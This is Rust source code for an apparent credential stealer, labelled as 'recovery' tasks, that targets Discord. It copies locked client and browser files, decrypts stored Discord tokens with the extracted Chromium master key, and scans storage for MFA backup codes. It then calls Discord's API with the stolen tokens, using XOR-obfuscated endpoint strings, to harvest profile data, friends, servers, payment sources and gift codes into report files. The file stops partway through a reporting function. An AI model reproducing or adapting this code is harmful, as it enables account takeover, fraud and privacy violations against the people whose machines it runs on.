use crate::recovery::browser::chromium::extract_master_key;
use crate::recovery::browser::lockedfile::copy_locked_file;
use crate::recovery::context::RecoveryContext;
use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::output::write_json_artifact;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use once_cell::sync::Lazy;
use regex::Regex;
use crate::recovery::helpers::winhttp::{Client, StatusCode};
use serde::de::DeserializeOwned;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;
use tokio::fs;
use tokio::sync::OnceCell;

pub fn discord_token_task(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(DiscordTokenTask::new(ctx)),
        Arc::new(BrowserDiscordTask::new(ctx)),
    ]
}

pub struct DiscordTokenTask {
    roots: Vec<(String, PathBuf)>,
}

static DISCORD_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> = Lazy::new(OnceCell::new);
static DISCORD_BROWSER_TOKEN_CACHE: Lazy<OnceCell<Arc<Vec<DiscordTokenRecord>>>> =
    Lazy::new(OnceCell::new);
static DISCORD_PROFILE_CACHE: Lazy<OnceCell<Arc<Vec<DiscordProfileRecord>>>> =
    Lazy::new(OnceCell::new);

impl DiscordTokenTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            roots: discord_roots(ctx),
        }
    }
}

fn discord_roots(ctx: &RecoveryContext) -> Vec<(String, PathBuf)> {
    let mut result = Vec::new();
    let roaming = ctx.roaming_data_dir.clone();
    let local = ctx.local_data_dir.clone();

    let variants = [
        ("Discord", "Discord.exe"),
        ("discordcanary", "DiscordCanary.exe"),
        ("discordptb", "DiscordPTB.exe"),
        ("Lightcord", "Lightcord.exe"),
        ("BetterDiscord", "Discord.exe"),
        ("ArmCord", "ArmCord.exe"),
        ("Vesktop", "Vesktop.exe"),
    ];

    for (dir_name, proc_name) in variants {
        let path = roaming.join(dir_name);
        if path.exists() {
            result.push((proc_name.to_string(), path));
        } else {
            let path_local = local.join(dir_name);
            if path_local.exists() {
                result.push((proc_name.to_string(), path_local));
            }
        }
    }
    result
}

fn decrypt_discord_token(value: &str, master_key: &[u8]) -> Result<String, RecoveryError> {
    let parts: Vec<_> = value.splitn(2, ':').collect();
    if parts.len() != 2 {
        return Err(RecoveryError::Custom("invalid token format".into()));
    }

    let encrypted = STANDARD
        .decode(parts[1])
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    if encrypted.len() <= 15 {
        return Err(RecoveryError::Custom("ciphertext too short".into()));
    }

    let nonce = Nonce::from_slice(&encrypted[3..15]);
    let payload = &encrypted[15..];
    let cipher = Aes256Gcm::new_from_slice(master_key)
        .map_err(|err| RecoveryError::Custom(format!("cipher init failed: {err}")))?;
    let decrypted = cipher
        .decrypt(nonce, payload)
        .map_err(|err| RecoveryError::Custom(format!("token decrypt failed: {err}")))?;

    String::from_utf8(decrypted)
        .map_err(|err| RecoveryError::Custom(format!("token utf8 decode failed: {err}")))
}

async fn read_safe(
    proc_name: &str,
    path: &Path,
    temp_dir: &Path,
) -> Result<Vec<u8>, RecoveryError> {
    if !path.exists() {
        return Err(RecoveryError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "file not found",
        )));
    }

    if let Ok(data) = fs::read(path).await {
        return Ok(data);
    }

    let temp_file = temp_dir.join(
        path.file_name()
            .unwrap_or_else(|| std::ffi::OsStr::new("temp")),
    );
    if copy_locked_file(proc_name, path, &temp_file) {
        let data = fs::read(&temp_file).await.map_err(RecoveryError::Io)?;
        let _ = fs::remove_file(&temp_file).await;
        Ok(data)
    } else {
        Err(RecoveryError::Custom("failed to read locked file".into()))
    }
}

async fn collect_tokens_for_path(
    proc_name: &str,
    root: &Path,
) -> Result<(Option<Vec<u8>>, HashSet<String>), RecoveryError> {
    let temp_dir = std::env::temp_dir().join("ixodes_discord_tmp");
    let _ = fs::create_dir_all(&temp_dir).await;

    let local_state = root.join("Local State");
    let master_key = if local_state.exists() {
        let temp_ls = temp_dir.join("Local State");
        if copy_locked_file(proc_name, &local_state, &temp_ls) {
            let key = extract_master_key(&temp_ls)?;
            let _ = fs::remove_file(&temp_ls).await;
            key
        } else {
            extract_master_key(&local_state)?
        }
    } else {
        None
    };

    let leveldb_dir = root.join("Local Storage").join("leveldb");
    let mut tokens = HashSet::new();
    if leveldb_dir.exists() {
        let mut dir = fs::read_dir(&leveldb_dir).await?;
        while let Some(entry) = dir.next_entry().await? {
            let file_type = entry.file_type().await?;
            if !file_type.is_file() {
                continue;
            }

            if let Some(ext) = entry.path().extension().and_then(|s| s.to_str()) {
                if ext != "ldb" && ext != "log" {
                    continue;
                }
            }

            if let Ok(data) = read_safe(proc_name, &entry.path(), &temp_dir).await {
                if let Ok(mut found) = scan_bytes_for_tokens(&data, master_key.is_some()) {
                    tokens.extend(found.drain());
                }
            }
        }
    }

    let _ = fs::remove_dir_all(&temp_dir).await;
    Ok((master_key, tokens))
}

#[derive(Serialize)]
struct DiscordTokenSummary<'a> {
    tokens: &'a [DiscordTokenRecord],
}

#[derive(Serialize, Clone)]
struct DiscordTokenRecord {
    source: String,
    raw: String,
    decrypted: Option<String>,
    error: Option<String>,
}

async fn gather_discord_token_records(
    roots: &[(String, PathBuf)],
) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
    let mut records = Vec::new();

    for (proc_name, root) in roots {
        let source_label = root.display().to_string();
        match collect_tokens_for_path(proc_name, root).await {
            Ok((master_key, tokens)) if !tokens.is_empty() => {
                for token in tokens {
                    let decrypted = if token.starts_with("dQw4w9WgXcQ:") {
                        master_key
                            .as_deref()
                            .and_then(|key| decrypt_discord_token(&token, key).ok())
                    } else {
                        Some(token.clone())
                    };

                    records.push(DiscordTokenRecord {
                        source: source_label.clone(),
                        raw: token.clone(),
                        decrypted,
                        error: None,
                    });
                }
            }
            Ok(_) => {}
            Err(err) => {
                records.push(DiscordTokenRecord {
                    source: source_label.clone(),
                    raw: String::new(),
                    decrypted: None,
                    error: Some(err.to_string()),
                });
            }
        }
    }

    Ok(records)
}

fn scan_bytes_for_tokens(
    buffer: &[u8],
    look_for_encrypted: bool,
) -> Result<HashSet<String>, RecoveryError> {
    let mut tokens = HashSet::new();

    if look_for_encrypted {
        let prefix_str = "dQw4w9WgXcQ:";
        let prefix = prefix_str.as_bytes();
        let mut cursor = 0usize;

        while cursor + prefix.len() <= buffer.len() {
            if &buffer[cursor..cursor + prefix.len()] == prefix {
                let search_start = cursor;
                if let Some(rel_end) = buffer[search_start..].iter().position(|&b| b == b'"') {
                    let end = search_start + rel_end;
                    if let Ok(token) = std::str::from_utf8(&buffer[cursor..end]) {
                        tokens.insert(token.to_string());
                    }
                    cursor = end + 1;
                } else {
                    break;
                }
            } else {
                cursor += 1;
            }
        }
    }

    let regex_normal = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").unwrap();
    let regex_mfa = Regex::new(r"mfa\.[\w-]{84}").unwrap();

    if let Ok(text) = std::str::from_utf8(buffer) {
        for caps in regex_normal.captures_iter(text) {
            tokens.insert(caps[0].to_string());
        }
        for caps in regex_mfa.captures_iter(text) {
            tokens.insert(caps[0].to_string());
        }
    }

    Ok(tokens)
}

fn scan_bytes_for_mfa_codes(buffer: &[u8]) -> HashSet<String> {
    let mut codes = HashSet::new();
    let mut cursor = 0;
    while cursor + 8 <= buffer.len() {
        let mut potential = true;
        for i in 0..8 {
            let b = buffer[cursor + i];
            if !b.is_ascii_lowercase() && !b.is_ascii_digit() {
                potential = false;
                break;
            }
        }

        if potential {
            let prev = if cursor > 0 { buffer[cursor - 1] } else { b' ' };
            let next = if cursor + 8 < buffer.len() {
                buffer[cursor + 8]
            } else {
                b' '
            };
            let is_delim = |b: u8| {
                b == b'"'
                    || b == b'\''
                    || b == b' '
                    || b == b'\n'
                    || b == b'\r'
                    || b == b'\0'
                    || b == b','
            };
            if is_delim(prev) && is_delim(next) {
                if let Ok(code) = std::str::from_utf8(&buffer[cursor..cursor + 8]) {
                    codes.insert(code.to_string());
                }
                cursor += 8;
                continue;
            }
        }
        cursor += 1;
    }
    codes
}

async fn collect_mfa_codes(proc_name: &str, root: &Path) -> Vec<String> {
    let mut codes = HashSet::new();
    let temp_dir = std::env::temp_dir().join("ixodes_discord_mfa_tmp");
    let _ = fs::create_dir_all(&temp_dir).await;

    let settings_path = root.join("settings.json");
    if settings_path.exists() {
        if let Ok(data) = read_safe(proc_name, &settings_path, &temp_dir).await {
            codes.extend(scan_bytes_for_mfa_codes(&data));
        }
    }

    let leveldb_dir = root.join("Local Storage").join("leveldb");
    if leveldb_dir.exists() {
        if let Ok(mut dir) = fs::read_dir(&leveldb_dir).await {
            while let Ok(Some(entry)) = dir.next_entry().await {
                let path = entry.path();
                if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                    if ext == "ldb" || ext == "log" {
                        if let Ok(data) = read_safe(proc_name, &path, &temp_dir).await {
                            codes.extend(scan_bytes_for_mfa_codes(&data));
                        }
                    }
                }
            }
        }
    }

    let _ = fs::remove_dir_all(&temp_dir).await;
    codes.into_iter().collect()
}

async fn cached_discord_tokens(
    roots: &[(String, PathBuf)],
) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
    let roots = roots.to_vec();
    let cached = DISCORD_TOKEN_CACHE
        .get_or_try_init(|| async move {
            let records = gather_discord_token_records(&roots).await?;
            Ok::<Arc<Vec<DiscordTokenRecord>>, RecoveryError>(Arc::new(records))
        })
        .await?;
    Ok(Arc::clone(cached))
}

#[async_trait]
impl RecoveryTask for DiscordTokenTask {
    fn label(&self) -> String {
        "Discord Tokens (Desktop)".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let records = cached_discord_tokens(&self.roots).await?;

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "discord-tokens-desktop.json",
            &DiscordTokenSummary {
                tokens: records.as_ref(),
            },
        )
        .await?;

        Ok(vec![artifact])
    }
}

struct BrowserDiscordTask {
    local_app_data: PathBuf,
}

impl BrowserDiscordTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            local_app_data: ctx.local_data_dir.clone(),
        }
    }
}

const BROWSER_PATHS: &[(&str, &str)] = &[
    ("Chrome", "Google\\Chrome\\User Data"),
    ("Edge", "Microsoft\\Edge\\User Data"),
    ("Brave", "BraveSoftware\\Brave-Browser\\User Data"),
    ("Opera", "Opera Software\\Opera Stable"),
    ("OperaGX", "Opera Software\\Opera GX Stable"),
    ("Vivaldi", "Vivaldi\\User Data"),
];

async fn gather_browser_discord_tokens(
    local_app_data: &Path,
) -> Result<Vec<DiscordTokenRecord>, RecoveryError> {
    let mut records = Vec::new();
    let temp_dir = std::env::temp_dir().join("ixodes_discord_browser_tmp");
    let _ = fs::create_dir_all(&temp_dir).await;

    for (browser_name, relative_path) in BROWSER_PATHS {
        let user_data = local_app_data.join(relative_path);
        if !user_data.exists() {
            continue;
        }

        let mut profiles = vec![user_data.join("Default")];
        if let Ok(mut entries) = fs::read_dir(&user_data).await {
            while let Ok(Some(entry)) = entries.next_entry().await {
                if let Ok(name) = entry.file_name().into_string() {
                    if name.starts_with("Profile") {
                        profiles.push(entry.path());
                    }
                }
            }
        }

        for profile in profiles {
            let leveldb = profile.join("Local Storage").join("leveldb");
            if !leveldb.exists() {
                continue;
            }

            let mut tokens = HashSet::new();
            if let Ok(mut dir) = fs::read_dir(&leveldb).await {
                while let Ok(Some(entry)) = dir.next_entry().await {
                    let path = entry.path();
                    if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                        if ext == "ldb" || ext == "log" {
                            if let Ok(data) = read_safe("browser", &path, &temp_dir).await {
                                if let Ok(mut found) = scan_bytes_for_tokens(&data, false) {
                                    tokens.extend(found.drain());
                                }
                            }
                        }
                    }
                }
            }

            for token in tokens {
                records.push(DiscordTokenRecord {
                    source: format!("{} - {}", browser_name, profile.display()),
                    raw: token.clone(),
                    decrypted: Some(token),
                    error: None,
                });
            }
        }
    }

    let _ = fs::remove_dir_all(&temp_dir).await;
    Ok(records)
}

async fn cached_browser_discord_tokens(
    local_app_data: &Path,
) -> Result<Arc<Vec<DiscordTokenRecord>>, RecoveryError> {
    let local_app_data = local_app_data.to_path_buf();
    let cached = DISCORD_BROWSER_TOKEN_CACHE
        .get_or_try_init(|| async move {
            let records = gather_browser_discord_tokens(&local_app_data).await?;
            Ok::<Arc<Vec<DiscordTokenRecord>>, RecoveryError>(Arc::new(records))
        })
        .await?;
    Ok(Arc::clone(cached))
}

#[async_trait]
impl RecoveryTask for BrowserDiscordTask {
    fn label(&self) -> String {
        "Discord Tokens (Browser)".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let records = cached_browser_discord_tokens(&self.local_app_data).await?;

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "discord-tokens-browser.json",
            &DiscordTokenSummary {
                tokens: records.as_ref(),
            },
        )
        .await?;

        Ok(vec![artifact])
    }
}

pub fn discord_profile_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(DiscordProfileTask::new(ctx))
}

pub struct DiscordProfileTask {
    roots: Vec<(String, PathBuf)>,
    local_app_data: PathBuf,
}

impl DiscordProfileTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            roots: discord_roots(ctx),
            local_app_data: ctx.local_data_dir.clone(),
        }
    }
}

struct DiscordApiClient {
    client: Client,
}

impl DiscordApiClient {
    fn new() -> Result<Self, RecoveryError> {
        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .build()
            .map_err(|err| RecoveryError::Custom(format!("discord client build failed: {err}")))?;
        Ok(Self { client })
    }

    async fn populate_record(&self, record: &mut DiscordProfileRecord) {
        // "/users/@me"
        let me_ep = deobf(&[0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8]);
        match self
            .request_discord_endpoint::<DiscordUser>(&record.token, &me_ep)
            .await
        {
            Ok(Some(user)) => record.user = Some(user.into()),
            Ok(None) => record.errors.push("users/@me unauthorized".into()),
            Err(err) => record.errors.push(err),
        }

        // "/users/@me/relationships"
        let rel_ep = deobf(&[
            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xCF, 0xD8, 0xDB,
            0xDA, 0xD9, 0xD4, 0xCF, 0xCE, 0xD0, 0xD2, 0xD3, 0xEE, 0xD4, 0xCB, 0xCE,
        ]);
        match self
            .request_discord_endpoint::<Vec<DiscordRelationship>>(&record.token, &rel_ep)
            .await
        {
            Ok(Some(relationships)) => {
                for relationship in relationships {
                    if let Some(user) = relationship.user {
                        let label = format!("{}#{}", user.username, user.discriminator);
                        match relationship.kind {
                            1 => record.friends.push(label),
                            2 => record.blocked_friends.push(label),
                            _ => {} // Ignore other relationship types
                        }
                    }
                }
            }
            Ok(None) => record
                .errors
                .push("relationship endpoint unauthorized".into()),
            Err(err) => record.errors.push(err),
        }

        // "/users/@me/guilds"
        let guilds_ep = deobf(&[
            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xDA, 0x88, 0xD4,
            0xDB, 0xDB, 0xCF, 0xCE,
        ]);
        match self
            .request_discord_endpoint::<Vec<DiscordGuild>>(&record.token, &guilds_ep)
            .await
        {
            Ok(Some(guilds)) => {
                for guild in guilds {
                    let summary = DiscordGuildSummary::from(guild);
                    if summary.owner {
                        record.owned_servers.push(summary);
                    } else {
                        record.other_servers.push(summary);
                    }
                }
            }
            Ok(None) => record.errors.push("guild endpoint unauthorized".into()),
            Err(err) => record.errors.push(err),
        }

        // "/users/@me/billing/payment-sources"
        let billing_ep = deobf(&[
            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xDB, 0xD4, 0xDB,
            0xDB, 0xD4, 0xCE, 0xDA, 0xAF, 0x8D, 0xDA, 0xCC, 0x90, 0xD8, 0xCF, 0xCE, 0xAF, 0xCF,
            0xCB, 0xC8, 0xCF, 0xDA, 0xD8, 0xCE,
        ]);
        match self
            .request_discord_endpoint::<Vec<DiscordBillingSource>>(&record.token, &billing_ep)
            .await
        {
            Ok(Some(sources)) => record.billing_sources = sources,
            Ok(None) => record.errors.push("billing endpoint unauthorized".into()),
            Err(err) => record.errors.push(err),
        }

        // "/users/@me/entitlements/gift-codes"
        let gifts_ep = deobf(&[
            0xAF, 0x88, 0xCE, 0xD8, 0xCF, 0xCE, 0xAF, 0xF3, 0xD0, 0xD8, 0xAF, 0xD8, 0xCF, 0xCE,
            0xD4, 0xCE, 0xDB, 0xD8, 0x90, 0xD8, 0xCF, 0xCE, 0x90, 0xAF, 0xDA, 0xD4, 0xDF, 0xCE,
            0xAF, 0xDA, 0xD2, 0xDB, 0xD8, 0xCE,
        ]);
        match self
            .request_discord_endpoint::<Vec<DiscordGiftCode>>(&record.token, &gifts_ep)
            .await
        {
            Ok(Some(gifts)) => record.gift_codes = gifts,
            Ok(None) => record
                .errors
                .push("gift codes endpoint unauthorized".into()),
            Err(err) => record.errors.push(err),
        }
    }

    async fn request_discord_endpoint<T>(
        &self,
        token: &str,
        endpoint: &str,
    ) -> Result<Option<T>, String>
    where
        T: DeserializeOwned,
    {
        // "https://discord.com/api/v10"
        let base_url = deobf(&[
            0xD5, 0xC9, 0xC9, 0xCD, 0xCE, 0x87, 0x92, 0x92, 0xDB, 0xD4, 0xCE, 0xDA, 0xD2, 0xCF,
            0xDB, 0x93, 0xDA, 0xD2, 0xDB, 0xAF, 0xDA, 0xCD, 0xD4, 0xAF, 0xC1, 0x8C, 0x8D,
        ]);
        let url = format!("{}{}", base_url, endpoint);
        let response = self
            .client
            .get(&url)
            .header("Authorization", token)
            .send()
            .await
            .map_err(|err| format!("{endpoint} request failed: {err}"))?;
        match response.status() {
            StatusCode::OK => response
                .json::<T>()
                .await
                .map(Some)
                .map_err(|err| format!("{endpoint} parse failed: {err}")),
            StatusCode::UNAUTHORIZED => Ok(None),
            status => Err(format!("{endpoint} returned {status}")),
        }
    }
}

async fn collect_discord_profiles_inner(
    roots: &[(String, PathBuf)],
    local_app_data: &Path,
    api: &DiscordApiClient,
) -> Result<Vec<DiscordProfileRecord>, RecoveryError> {
    let mut profiles = Vec::new();
    let mut seen = HashSet::new();
    let mut tokens = cached_discord_tokens(roots).await?.as_ref().clone();
    tokens.extend(
        cached_browser_discord_tokens(local_app_data)
            .await?
            .as_ref()
            .clone(),
    );

    for record in tokens.iter().filter_map(|rec| {
        rec.decrypted
            .as_ref()
            .map(|token| (rec.source.clone(), token.clone()))
    }) {
        let (source, token) = record;
        if !seen.insert(token.clone()) {
            continue;
        }

        let mut profile = DiscordProfileRecord::new(source.clone(), token);
        api.populate_record(&mut profile).await;

        if let Some((proc_name, root_path)) = roots
            .iter()
            .find(|(_, r)| r.display().to_string() == source)
        {
            profile.mfa_backup_codes = collect_mfa_codes(proc_name, root_path).await;
        }

        profiles.push(profile);
    }

    Ok(profiles)
}

async fn cached_discord_profiles(
    roots: &[(String, PathBuf)],
    local_app_data: &Path,
) -> Result<Arc<Vec<DiscordProfileRecord>>, RecoveryError> {
    let roots = roots.to_vec();
    let local_app_data = local_app_data.to_path_buf();
    let cached = DISCORD_PROFILE_CACHE
        .get_or_try_init(|| async move {
            let api = DiscordApiClient::new()?;
            let profiles = collect_discord_profiles_inner(&roots, &local_app_data, &api).await?;
            Ok::<Arc<Vec<DiscordProfileRecord>>, RecoveryError>(Arc::new(profiles))
        })
        .await?;
    Ok(Arc::clone(cached))
}

#[derive(Serialize)]
struct DiscordProfileSummary<'a> {
    profiles: &'a [DiscordProfileRecord],
}

#[derive(Serialize)]
struct DiscordProfileRecord {
    source: String,
    token: String,
    user: Option<DiscordUserSummary>,
    friends: Vec<String>,
    blocked_friends: Vec<String>,
    owned_servers: Vec<DiscordGuildSummary>,
    other_servers: Vec<DiscordGuildSummary>,
    billing_sources: Vec<DiscordBillingSource>,
    gift_codes: Vec<DiscordGiftCode>,
    mfa_backup_codes: Vec<String>,
    errors: Vec<String>,
}

impl DiscordProfileRecord {
    fn new(source: String, token: String) -> Self {
        Self {
            source,
            token,
            user: None,
            friends: Vec::new(),
            blocked_friends: Vec::new(),
            owned_servers: Vec::new(),
            other_servers: Vec::new(),
            billing_sources: Vec::new(),
            gift_codes: Vec::new(),
            mfa_backup_codes: Vec::new(),
            errors: Vec::new(),
        }
    }
}

#[derive(Deserialize, Serialize)]
struct DiscordBillingSource {
    #[serde(rename = "type")]
    kind: i32,
    invalid: bool,
    brand: Option<String>,
    last_4: Option<String>,
    email: Option<String>,
}

#[derive(Deserialize, Serialize)]
struct DiscordGiftCode {
    code: String,
    #[serde(rename = "sku_id")]
    sku_id: Option<String>,
}

#[derive(Deserialize)]
struct DiscordUser {
    id: String,
    username: String,
    #[serde(rename = "global_name")]
    global_name: Option<String>,
    clan: Option<String>,
    #[serde(rename = "mfa_enabled")]
    mfa_enabled: Option<bool>,
    locale: Option<String>,
    email: Option<String>,
    verified: Option<bool>,
    phone: Option<String>,
    bio: Option<String>,
    #[serde(rename = "public_flags")]
    public_flags: Option<u64>,
    #[serde(rename = "premium_type")]
    premium_type: Option<i32>,
}

#[derive(Serialize)]
struct DiscordUserSummary {
    id: String,
    username: String,
    global_name: Option<String>,
    clan: Option<String>,
    mfa_enabled: Option<bool>,
    locale: Option<String>,
    email: Option<String>,
    verified: Option<bool>,
    phone: Option<String>,
    bio: Option<String>,
    badges: Vec<String>,
    nitro: String,
}

impl From<DiscordUser> for DiscordUserSummary {
    fn from(source: DiscordUser) -> Self {
        let mut badges = Vec::new();
        if let Some(flags) = source.public_flags {
            if flags & 1 != 0 {
                badges.push("Staff".into());
            }
            if flags & 2 != 0 {
                badges.push("Partner".into());
            }
            if flags & 4 != 0 {
                badges.push("HypeSquad".into());
            }
            if flags & 8 != 0 {
                badges.push("BugHunter".into());
            }
            if flags & 64 != 0 {
                badges.push("HypeSquad Bravery".into());
            }
            if flags & 128 != 0 {
                badges.push("HypeSquad Brilliance".into());
            }
            if flags & 256 != 0 {
                badges.push("HypeSquad Balance".into());
            }
            if flags & 512 != 0 {
                badges.push("Early Supporter".into());
            }
            if flags & 16384 != 0 {
                badges.push("BugHunter Gold".into());
            }
            if flags & 131072 != 0 {
                badges.push("Verified Developer".into());
            }
            if flags & 4194304 != 0 {
                badges.push("Active Developer".into());
            }
        }

        let nitro = match source.premium_type {
            Some(1) => "Nitro Classic",
            Some(2) => "Nitro",
            Some(3) => "Nitro Basic",
            _ => "None",
        };

        Self {
            id: source.id,
            username: source.username,
            global_name: source.global_name,
            clan: source.clan,
            mfa_enabled: source.mfa_enabled,
            locale: source.locale,
            email: source.email,
            verified: source.verified,
            phone: source.phone,
            bio: source.bio,
            badges,
            nitro: nitro.to_string(),
        }
    }
}

#[derive(Deserialize)]
struct DiscordRelationship {
    #[serde(rename = "type")]
    kind: i32,
    user: Option<DiscordRelationshipUser>,
}

#[derive(Deserialize)]
struct DiscordRelationshipUser {
    #[serde(rename = "id")]
    _id: String,
    username: String,
    discriminator: String,
}

#[derive(Deserialize)]
struct DiscordGuild {
    id: String,
    name: String,
    owner: bool,
    permissions: Option<String>,
    features: Option<Vec<String>>,
}

#[derive(Serialize)]
struct DiscordGuildSummary {
    id: String,
    name: String,
    owner: bool,
    permissions: Option<String>,
    discoverable: bool,
    vanity_url: bool,
}

impl From<DiscordGuild> for DiscordGuildSummary {
    fn from(source: DiscordGuild) -> Self {
        let mut discoverable = false;
        let mut vanity_url = false;
        if let Some(features) = source.features.as_ref() {
            for feature in features {
                if feature.eq_ignore_ascii_case("discoverable") {
                    discoverable = true;
                } else if feature.eq_ignore_ascii_case("vanity_url") {
                    vanity_url = true;
                }
                if discoverable && vanity_url {
                    break;
                }
            }
        }
        Self {
            id: source.id,
            name: source.name,
            owner: source.owner,
            permissions: source.permissions,
            discoverable,
            vanity_url,
        }
    }
}

#[async_trait]
impl RecoveryTask for DiscordProfileTask {
    fn label(&self) -> String {
        "Discord Profiles".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let profiles = cached_discord_profiles(&self.roots, &self.local_app_data).await?;

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "discord-profiles.json",
            &DiscordProfileSummary {
                profiles: profiles.as_ref(),
            },
        )
        .await?;

        Ok(vec![artifact])
    }
}

pub fn discord_service_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(DiscordServiceTask::new(ctx))
}

struct DiscordServiceTask {
    roots: Vec<(String, PathBuf)>,
    local_app_data: PathBuf,
}

impl DiscordServiceTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            roots: discord_roots(ctx),
            local_app_data: ctx.local_data_dir.clone(),
        }
    }
}

#[async_trait]
impl RecoveryTask for DiscordServiceTask {
    fn label(&self) -> String {
        "Discord Service Helper".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Messengers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let profiles = cached_discord_profiles(&self.roots, &self.local_app_data).await?;

        let mut user_builder = String::new();
        let mut friends_builder = format!("Friends:\n====================\n\n");
        let mut blocked_builder = format!("Blocked Friends:\n====================\n\n");
        let mut owned_builder = format!("Owned Servers:\n====================\n\n");
        let mut other_builder = format!("Other Servers:\n====================\n\n");

        if profiles.is_empty() {
            user_builder.push_str("No Discord profiles recovered.\n");
            friends_builder.push_str("No friends recovered.\n\n");
            blocked_builder.push_str("No blocked friends recovered.\n\n");
            owned_builder.push_str("No owned servers recovered.\n\n");
            other_builder.push_str("No other servers recovered.\n\n");
        } else {
            for profile in profiles.iter() {
                let user = profile.user.as_ref();
                let display_name = user
                    .and_then(|u| u.global_name.as_deref())
                    .unwrap_or_default();
                let username = user.map(|u| u.username.as_str()).unwrap_or_default();
                let user_id = user.map(|u| u.id.as_str()).unwrap_or_default();
                let email = user.and_then(|u| u.email.as_deref()).unwrap_or_default();
                let phone = user.and_then(|u| u.phone.as_deref()).unwrap_or_default();
                let clan = user.and_then(|u| u.clan.as_deref()).unwrap_or("None");
                let mfa = user.and_then(|u| u.mfa_enabled).unwrap_or(false);
                let verified = user.and_then(|u| u.verified).unwrap_or(false);
                let locale = user.and_then(|u| u.locale.as_deref()).unwrap_or_default();
                let bio = user.and_then(|u| u.bio.as_deref()).unwrap_or_default();
                let nitro = user.map(|u| u.nitro.as_str()).unwrap_or("None");
                let badges = user.map(|u| u.badges.join(", ")).unwrap_or_default();

                user_builder.push_str(&format!(
                    "Display Name: {}\nUsername: {} ({})\nEmail: {}\nPhone: {}\nNitro: {}\nBadges: {}\nToken: {}\nClan: {}\nMFA Enabled: {}\nVerified: {}\nLocale: {}\nBio:\n{}\n\n",
                    display_name,
                    username,
                    user_id,
                    email,
                    phone,
                    nitro,
                    badges,
                    profile.token,
                    clan,
                    mfa,
                    verified,
                    locale,
                    bio,
                ));

                if !profile.billing_sources.is_empty() {
                    user_builder.push_str("Billing Sources:\n");
                    for source in &profile.billing_sources {
                        let kind_str = match source.kind {
                            1 => "Credit Card",
                            2 => "PayPal",
                            _ => "Other",
                        };
                        user_builder.push_str(&format!(
                            "  Type: {}, Brand: {}, Last4: {}, Email: {}, Invalid: {}\n",
                            kind_str,
                            source.brand.as_deref().unwrap_or("N/A"),
                            source.last_4.as_deref().unwrap_or("N/A"),
                            source.email.as_deref().unwrap_or("N/A"),
                            source.invalid
                        ));
                    }
                    user_builder.push('\n');
                }

                if !profile.gift_codes.is_empty() {
                    user_builder.push_str("Gift Codes:\n");
                    for gift in &profile.gift_codes {
                        user_builder.push_str(&format!(
                            "  Code: {} (SKU: {})\n",
                            gift.code,
                            gift.sku_id.as_deref().unwrap_or("N/A")
                        ));
                    }
                    user_builder.push('\n');
                }

                if !profile.mfa_backup_codes.is_empty() {
                    user_builder.push_str("MFA Backup Codes:\n");
                    for code in &profile.mfa_backup_codes {
                        user_builder.push_str(&format!("  {}\n", code));
                    }
                    user_builder.push('\n');
                }

                if !profile.errors.is_empty() {
                    user_builder.push_str("Errors:\n");
                    for error in &profile.errors {
                        user_builder.push_str(error);
                        user_builder.push('\n');
                    }
                    user_builder.push('\n');
                }

                for friend in &profile.friends {
                    friends_builder.push_str(friend);
                    friends_builder.push('\n');
                }
                friends_builder.push('\n');

                for blocked in &profile.blocked_friends {
                    blocked_builder.push_str(blocked);
                    blocked_builder.push('\n');
                }
                blocked_builder.push('\n');

                for guild in &profile.owned_servers {
                    owned_builder.push_str(&format!(
                        "Name: {} ({})\nPermissions: {}\nDiscoverable: {}\nCustom Link: {}\n\n",
                        guild.name,
                        guild.id,
                        guild.permissions.as_deref().unwrap_or_default(),
                        guild.discoverable,
                        guild.vanity_url,
                    ));
                }
